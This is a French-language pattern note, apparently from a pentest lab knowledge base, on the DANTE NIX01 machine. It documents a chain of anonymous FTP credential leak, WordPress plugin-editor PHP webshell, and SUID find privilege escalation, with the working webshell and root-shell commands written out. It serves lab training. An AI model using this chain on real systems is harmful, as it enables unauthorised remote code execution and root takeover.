---
doc_kind: pattern
title: "DANTE NIX01 - entree VPN, WordPress RCE et SUID find"
category: web
slug: nix01-wordpress-rce-suid-find
created: 2026-10-29
status: active
tags:
  - wordpress
  - plugin-editor-rce
  - suid-find
  - ftp-anonymous
  - privesc-euid
chain_summary: "FTP anonyme fuite creds WordPress, editeur de plugins WP permet RCE directe en PHP, puis /usr/bin/find SUID root abuse via -exec install -m 4755 (pas de shebang = euid conserve)."
---
# DANTE NIX01 - entree VPN, WordPress RCE et SUID find

## Chain Summary

- One-line chain: FTP anonyme fuite creds WordPress, editeur de plugins WP permet RCE directe en PHP, puis /usr/bin/find SUID root abuse via -exec install -m 4755 (pas de shebang = euid conserve).

## Preconditions

- Voir le writeup associe pour le contexte precis de la cible.

## Cheap Probes

- Rechercher les signaux initiaux decrits dans la chaine d'exploit ci-dessous.

## Telltale Evidence

- uid=33(www-data) apres webshell; -rwsr-xr-x root sur /tmp/bsh; uid=0(root) apres execution -p.

## Escalation Order

1. nmap -p- -> WordPress sur port non standard.
2. FTP anonyme (mode actif requis) -> todo.txt -> creds.
3. Login wp-admin, editeur de plugins (theme editor bloque par nonce).
4. Remplacer un plugin par un webshell PHP system($_GET['c']).
5. RCE confirmee, lire user.txt.
6. su avec creds trouvees -> flag mid.
7. find SUID root: find z -exec install -m 4755 /bin/bash /tmp/bsh \; -quit (jamais -exec /bin/bash -c, le shebang fait retomber l'euid).
8. /tmp/bsh -p -> root.

## Common Mistakes

- Ne pas verifier ce signal/cette condition avant de passer a une autre piste (voir lecon ci-dessous).

## Payload Shapes

```text
SUID find doit passer par install -m 4755 (binaire direct), jamais par un script/shebang qui perd l'euid; FTP anonyme necessite souvent mode actif.
```

## Related Writeups

- nix01-wordpress-rce-suid-find

## Skill Impact

- Related skill: a classer lors d'une prochaine passe skill-maintainer si le pattern se repete.
- Rule to add or update: (backlog only for now; promote if this pattern repeats)
